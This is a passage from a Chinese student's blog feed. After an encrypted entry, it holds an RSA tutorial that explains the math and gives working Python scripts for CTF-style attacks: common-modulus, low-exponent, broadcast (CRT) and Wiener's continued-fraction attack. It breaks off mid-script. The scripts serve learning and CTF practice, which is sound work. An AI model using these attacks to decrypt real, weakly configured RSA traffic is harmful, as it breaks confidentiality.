        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="cc870ae4d66ba4459b7c460028e2ef27f10b1bdab3d8b09a29336b7c2e587b46">f9fdf6dc2768eb85647c85c8409b1f9725e97ba585148366a159740e8ea60f0ea743321875daa6e576e288ef2beea9e4c1c068c9ab1f3dd80f24ad7107161f67ce245967ad41b3c5aab260939bd630fed302311668ac577d27bd6d3da85b0a239bbf26b302c26d51d213677b4294590bd1f451be7328a3f3e989c546c6a11a868a3b4b0c80f64fc8d15926b19351c5cb0d8a9ec93818d34f6e485fc1171d4a5848e1cfdb658169c751ecb2ef128ba1276daccde9f644d75c48adcbeec6c6042d444efb61190fbd870e68108cbf22240d0eac1f1a0b09a80fe5c3e244f285f5063a88b239e743b819f30c4206f2db0128d151359dc35eeba657112c008e123fef881e4a3056340ae9afaba8fe644993802754e833a93c8e48874c6d2b153722a94a5c2d87c7d43215250f67f08afc0599665c09f5cc461304eb89cd5af6a5a595494d1372ee8b33b139ed7ca753962ddeedaf7b416d566819b9db2e7a49d298ecf6fccae15eb01c9df10fea26205af50e1e9b300392d8dc083b9f5fe03d9bccfedb819ba0ab570b921ae42ebf76b4b7405147558c1a8eade76fc55ca7c0d97f9341207692d2130c4311fd2c117f8e00b28e508fbe3de0af6e706758cb4484388349123dc5b4df14d1aeee9a48e2bf46e5d9016c4a064c67f2e4b70ad4a7d1b1e5229c1a00d8608ce4d993277467f1c1475acd7abc54f1269ae8e01613a692165a3c590b29f89b86a7f9991794ae8d2cc8fe95f6c9ce7d6e24b5ecd4a78eb8ae3f47b2a5f8310353b687ff3bf6a408aad19b058b6fbbf63783804be74b2123da8e1d3fd28764622c5f08782fc88a1d6c37f8a28b6769fb882c110eb2202ecfe3b6df407390452d5f77bcbfaa20ce4ed0d0fd1ba54a2592d2b59d2abcf3d26e9ba2175f400ec1f0e401bf08e61a29d704c6865cb34235714df84996a5af148a1968d75414a27032dcb5b871014b426a0425a72e2a94fe9ad4be54704466f7c6a48ec109a506e3bd11d45575ec2b388da6d048e76ddd54b23c6bbadcc52833583ddab5495d1b3d5972cdd179819e63dc9cdc82fab61ae7ef742929db8c81d5c5bda418494e754cecf660bf4525b58bd5b22a42fd4266027b044eb7bd9878df4e01758ec7a6dee4d9d0aa4b2fe6ce60442da5f546a54a3ae029149c4dc5412c6c5bcc82fb3fa6c5ae88791eaa3da2627a6649121288eb5b91027812bdbf32758915ada3181a186ab92e5200199d802eb14e47b95b1ba764d190dc7c606e87636fa3ad07a7d7f1dd9a395b38ee6b4aeecba5cd58951c2e6d5cbd083ed040a583e046321c931f34ac7b35775dc8818c69dc34c0081d9eeb66179ceedf8bb83dddf15b9b91645c734c4d6d277a215e872d6d14fb10c9e79738fd77eccff8149d937dc62f1606944212933bc0cae1de920ee74147c6174dd7cc05207b86ef7a9bf6bb55d688a0343a0351da4666a62323e544ab98a76914520a7368b22363270d948ec566bc9a7777fa10945018a01aea47b46fce</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSA原理</title>
      <link href="/2025/07/16/RSA%E5%8E%9F%E7%90%86/"/>
      <url>/2025/07/16/RSA%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>大二下学期有学信息安全数学基础课程，分数考的好低(心痛😭</p><p>要学密码学吗，没想好，或许先试试吧</p><h1 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h1><p>生成密钥：</p><p>选择两个大素数p和q(通常1024位或更长)，计算它们的乘积n&#x3D;p*q，n称为模数，是公钥和私钥共有的部分</p><p>计算n的欧拉函数值 ϕ(n)&#x3D;(p-1)(q-1)</p><p>选择公钥指数e,满足1&lt;e&lt;ϕ(n)且<em>e</em> 与 ϕ(n)互质</p><p>计算私钥指数d，d是e关于模 ϕ(n)的乘法逆元，<em>d</em>≡<em>e</em>−1(mod<em>ϕ</em>(<em>n</em>))</p><p>密钥对：公钥(e,n)  私钥(d,n)</p><p>加密 (用公钥 (e,n))：<br>对明文m（需转换为整数且 m&lt;n），计算密文 c：<em>c</em>≡<em>m**e</em>(mod<em>n</em>)</p><p>解密 (用私钥 (d,n))：<br>对密文 c，计算明文 m：<em>m</em>≡<em>c**d</em>(mod<em>n</em>)</p><p>RSA的安全性依赖于大数分解的困难性，是现代网络安全（如HTTPS、数字签名）的基石之一</p><p>怎么求逆元🤔<br>1.扩展欧几里得算法</p><p><img src="/2025/07/16/RSA%E5%8E%9F%E7%90%86/ouji.jpg" alt="ouji"></p><p>2.欧拉定理</p><p>费马小定理：若p为素数，则有a^{p-1}≡1(mod p)<br>a^{p-2}*a≡1(mod p)<br>p−2就是a在mod p意义下的逆元</p><p>欧拉定理：若a、p互素，则有a^{φ(p)}≡1(mod p)(费马小定理的一般形式)<br>a^{φ(p)-1}*a≡1(mod p)<br>a^{φ(p)−1}就是a在mod p意义下的逆元</p><p>RSA的正确性证明需要中国剩余定理</p><h1 id="加密脚本"><a href="#加密脚本" class="headerlink" title="加密脚本"></a>加密脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 Crypto.Util.number 模块中的所有函数</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 导入 gmpy2 模块，用于高性能的数学运算</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment"># 从 secret 模块导入 flag，通常用于表示隐藏信息</span></span><br><span class="line"><span class="comment"># from secret import flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这是给出了 flag 的样式，并不是真正的 flag，但已经提供了一些提示，有些题目会根据 flag 头来破解</span></span><br><span class="line">flag = <span class="string">b&quot;this_is_a_secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成两个 1024 位的质数 p 和 q</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 n，即 p 和 q 的乘积，用于 RSA 算法的模数</span></span><br><span class="line">n = p * q</span><br><span class="line"><span class="comment"># 定义公钥指数 e，通常为 65537</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment"># 将 flag 转换为长整数</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 gmpy2 模块的 powmod 函数进行模幂运算，加密消息得到密文 c</span></span><br><span class="line">c = gmpy2.powmod(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印模数 n</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 打印公钥指数 e</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 打印加密后的密文 c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 打印质数 p（通常在 CTF 中不会直接给出）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 打印质数 q（通常在 CTF 中不会直接给出）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 Crypto.Util.number 模块中的所有函数，用于处理数字和字节之间的转换等</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;输入部分&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 已知的模数 n，用于 RSA 加密和解密</span></span><br><span class="line">n = <span class="number">4024941574680124502316363981547051098032677531528457166859670261861728313081282635664023890534034586556845494323497683923813915739234466472396261320600483</span></span><br><span class="line"><span class="comment"># 已知的公钥指数 e，通常为 65537</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment"># 已知的密文 c，需要被解密</span></span><br><span class="line">c = <span class="number">226967182640114431119923862488626190608050511354278604627242247124377735518111678279381846350389469161980779137969837090666693533616114290831130137310320</span></span><br><span class="line"><span class="comment"># 已知的质数 p，用于计算私钥</span></span><br><span class="line">p = <span class="number">62658315832909660478685872111870233686035497063073558738980225214351386198939</span></span><br><span class="line"><span class="comment"># 已知的质数 q，用于计算私钥</span></span><br><span class="line">q = <span class="number">64236351092062515945998729497153532140067861836088195242257976217499252460697</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;处理部分&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 计算欧拉函数 phi(n)，用于RSA算法中的私钥计算</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 计算私钥指数 d ，即 e 在模 phi(n) 的逆元</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line"><span class="comment"># 使用私钥指数 d 解密密文 c，得到明文 m，具体就是 m = c ** d (modn)</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="comment"># 将解密后的长整数 m 转换回字符串，得到原始的 flag 信息</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;输出部分&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 打印解密后的 flag 信息</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>yafu用于自动整数因式分解，在RSA中，当p、q的取值差异过大或过于相近的时候，使用yafu可以快速的把n值分解出p、q值</p><ol><li><p>假如要分解因数 6 ，输入命令：<code>.\yafu-x64.exe &quot;factor(6)&quot;</code>。</p></li><li><p>如果因数过长，将 因数 用文本文件存放在 yafu 目录下，例如：data.txt 。文件最后一行一定要换行，否则eof; done processing batchfile</p><p>命令：.\yafu-x64.exe “factor(@)” -batchfile data.txt</p></li></ol><h1 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>给出n,e和c的十进制数值，直接用yafu或factordb分解n恢复密钥解密</p><p>给出公钥文件（如<code>.pem</code>或<code>.pub</code>）和密文文件（如<code>flag.enc</code>），要求通过分析公钥提取模数<code>n</code>和指数<code>e</code>，分解<code>n</code>得到<code>p</code>和<code>q</code>，进而计算私钥<code>d</code>并解密密文</p><p>openssl rsa -pubin -in pubkey.pem  -text -modulus 获取e和n,c是flag.enc这个文件的16进制打开，然后转成10进制</p><p><a href="https://blog.csdn.net/CliffordR/article/details/82747112">RSA解密</a></p><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>明文m被不同的e1,e2和相同的n加密，生成不同的密文c1,c2，gcd(e1,e2)&#x3D;1</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">common_modulus_attack</span>(<span class="params">n, e1, e2, c1, c2</span>):</span><br><span class="line">    <span class="comment"># 扩展欧几里得算法，求解 a * e1 + b * e2 = 1</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> (a, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            g, y, x = egcd(b, a % b)</span><br><span class="line">            <span class="keyword">return</span> (g, x, y - (a // b) * x)</span><br><span class="line"></span><br><span class="line">    g, a, b = egcd(e1, e2)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;e1 and e2 are not coprime!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 若 a &lt; 0，则计算 c1^&#123;-a&#125; mod n，即模逆+幂</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; <span class="number">0</span>:</span><br><span class="line">        c1 = inverse(c1, n)</span><br><span class="line">        a = -a</span><br><span class="line">    <span class="keyword">if</span> b &lt; <span class="number">0</span>:</span><br><span class="line">        c2 = inverse(c2, n)</span><br><span class="line">        b = -b</span><br><span class="line"></span><br><span class="line">    m = (<span class="built_in">pow</span>(c1, a, n) * <span class="built_in">pow</span>(c2, b, n)) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例数据（演示用，请替换为真实数据）</span></span><br><span class="line">n = <span class="number">18962682884029916758266148712505745769930251807486581175852746411420202928241516937832183978007221718832524708070926778926047462679852701680119573672086987102806746013917856291115241315396097056547791102379598520572653521839151746091770505325576025506216040948960407634360766413917009528663176592446406188935607285249768406522483451323332869038201690761692396934508701198776039170160825932569854510890717698839864324907395534236377475429151260126650206505223888915546928897884818098697371381102013517518088143512010341618604013730873811895372101358873053673492497993058229695619855124625929422288077109937999813125009</span></span><br><span class="line">e1 = <span class="number">17</span></span><br><span class="line">e2 = <span class="number">13</span></span><br><span class="line">m = <span class="string">b&quot;attack at dawn&quot;</span></span><br><span class="line">m_int = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟加密得到 c1, c2</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m_int, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m_int, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行共模攻击还原明文</span></span><br><span class="line">recovered_m = common_modulus_attack(n, e1, e2, c1, c2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered message:&quot;</span>, long_to_bytes(recovered_m))</span><br></pre></td></tr></table></figure><h2 id="低指数攻击"><a href="#低指数攻击" class="headerlink" title="低指数攻击"></a>低指数攻击</h2><p>RSA 低指数攻击通常指 当使用较小的公钥指数（如 e&#x3D;3）且没有足够的填充即明文过小导致m^e &lt; n）时，可以直接通过取 e 次根得到明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">low_exponent_attack</span>(<span class="params">c, e</span>):</span><br><span class="line">    <span class="comment"># 直接计算整数的e次根</span></span><br><span class="line">    m_root, exact = gmpy2.iroot(c, e)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exact:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;The root is not exact; m^e &gt;= n, attack failed.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m_root)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例明文</span></span><br><span class="line">plaintext = <span class="string">b&quot;attack at dawn&quot;</span></span><br><span class="line">m = bytes_to_long(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数设置（低指数 e=3）</span></span><br><span class="line">n = <span class="number">17207813408827103864232834453718240404256207776473195603833883222550085713263312178061956051570981138304553424351533759341843886988037589996836800172080989247901092860675283917792376508142626356947018854628009464434064348703066932998068320382047678068831988903330670000137190543367195121038536391898033648631182445857699244565169300742700970528157714029607334860854474360615932123721060603038551920908076990199310564184431371353455563870497874701913547639261995158683757252811208140013377653322801908827687229389173989691699203062882442083075199375009430197914167802307859798384351637765054362302474384036006738670083</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行攻击</span></span><br><span class="line">recovered = low_exponent_attack(c, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered message:&quot;</span>, long_to_bytes(recovered))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h2><p>多个不同模n(互素），相同明文m，使用相同的小e加密</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">items</span>):</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> items))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">        m = N // n</span><br><span class="line">        d, r, s = gmpy2.gcdext(n, m)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Input not pairwise co-prime&quot;</span>)</span><br><span class="line">        result += a * s * m</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例数据（需至少2组n和c）</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = [</span><br><span class="line"><span class="number">3733764742621371987947351902968312868056845889086054346406914908377408144612536549613883596047991001782736997571483548656987227352705958618056056807752367</span>,</span><br><span class="line"><span class="number">5975714612645545165217802713165264900295593190225535517994609218472455963199049168546710002169642814118703212038789758731340259084486414821051036778066333</span></span><br><span class="line">]</span><br><span class="line">c = [</span><br><span class="line"><span class="number">7722709502790459166639993213708833737796147876436427049309008419119949153843426449996193173565875000</span>,</span><br><span class="line"><span class="number">7722709502790459166639993213708833737796147876436427049309008419119949153843426449996193173565875000</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查数据是否有效</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(n) &lt; <span class="number">2</span> <span class="keyword">or</span> <span class="built_in">len</span>(c) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;需要至少2组 (n, c) 数据&quot;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">zip</span>(c, n))</span><br><span class="line">x, N = CRT(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开立方恢复m</span></span><br><span class="line">m = gmpy2.iroot(x, e)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> m[<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;无法开立方，可能 m^3 &gt;= N 或数据无效&quot;</span>)</span><br><span class="line"></span><br><span class="line">m_int = <span class="built_in">int</span>(m[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m is:&#x27;</span>, long_to_bytes(m_int))</span><br></pre></td></tr></table></figure><h2 id="低解密指数攻击"><a href="#低解密指数攻击" class="headerlink" title="低解密指数攻击"></a>低解密指数攻击</h2><p>d也称为解密指数，当d比较小的时候，e也就特别大，所以发现e特别大的时候考虑低解密指数攻击,核心思想是利用 连分数逼近从公钥 (e,n)中恢复出私钥 d</p><p>Wiener 攻击成立的条件是：d&lt;1&#x2F;3n^{1&#x2F;4}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    cF = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cF.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cF</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Simplify</span>(<span class="params">ctnf</span>):</span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">reversed</span>(ctnf):</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> (numerator, denominator)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculateFrac</span>(<span class="params">x, y</span>):</span><br><span class="line">    cF = continuedFra(x, y)</span><br><span class="line">    cF = [Simplify(cF[:i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cF)+<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">return</span> cF</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="keyword">for</span> (d, k) <span class="keyword">in</span> calculateFrac(e, n):</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(<span class="built_in">int</span>(p)), <span class="built_in">abs</span>(<span class="built_in">int</span>(q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[!]not find!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line">p, q = wienerAttack(e, n)</span><br><span class="line"><span class="keyword">if</span> p <span class="keyword">and</span> q:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]Found!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-]p =&#x27;</span>, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-]q =&#x27;</span>, q)</span><br><span class="line">    d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span 